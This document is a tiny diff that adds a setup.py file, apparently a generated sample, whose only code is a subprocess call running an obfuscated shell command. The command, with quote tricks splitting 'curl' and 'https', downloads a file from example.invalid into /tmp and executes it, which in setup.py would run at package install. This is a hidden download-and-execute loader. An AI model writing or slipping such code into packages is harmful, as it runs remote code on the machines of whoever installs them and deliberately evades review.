@@ -1,0 +1,6 @@
+# path: setup.py
+# lines: 2
+# weight: 35
+# ---
+import subprocess
+subprocess.run(["sh", "-c", "c''url -o /tmp/x htt''ps://example.invalid/x; sh /tmp/x"])
